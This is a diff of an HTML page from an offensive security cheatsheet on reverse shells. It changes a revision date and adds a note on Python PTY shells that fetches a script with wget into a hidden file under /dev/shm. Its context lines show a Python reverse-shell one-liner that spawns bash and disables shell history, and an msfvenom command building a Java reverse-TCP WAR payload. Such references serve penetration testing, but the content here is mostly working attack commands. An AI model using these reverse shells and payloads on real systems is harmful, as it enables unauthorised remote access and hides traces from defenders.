@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-08-23T16:02:43 CEST">
+<meta name="revised" content="2019-09-02T09:51:11 CEST">
 <title>Reverse Shell :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1495,7 +1495,11 @@ python -c <span style="color:#d88200">&#39;import socket,pty,os;lhost = &#34;IP&
 </span><span style="color:#d88200">os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
 </span><span style="color:#d88200">os.putenv(&#34;HISTFILE&#34;,&#34;/dev/null&#34;); pty.spawn(&#34;/bin/bash&#34;); s.close();&#39;</span></code></pre></div>
 <p><br/></p>
-
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Python PTY Shells python-pty-shells</span>
+<span style="color:#75715e"># Can be very good</span> 
+simpleHTTPServer
+wget ... -O /dev/shm/.rev.py
+python tcp_pty_shell_handler -b ip:port</code></pre></div>
 <h3 id="windows-war-reverse-shell">Windows - WAR Reverse Shell</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Build the payload</span>
 msfvenom -p java/shell_reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span>IP <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f war -o shell.war
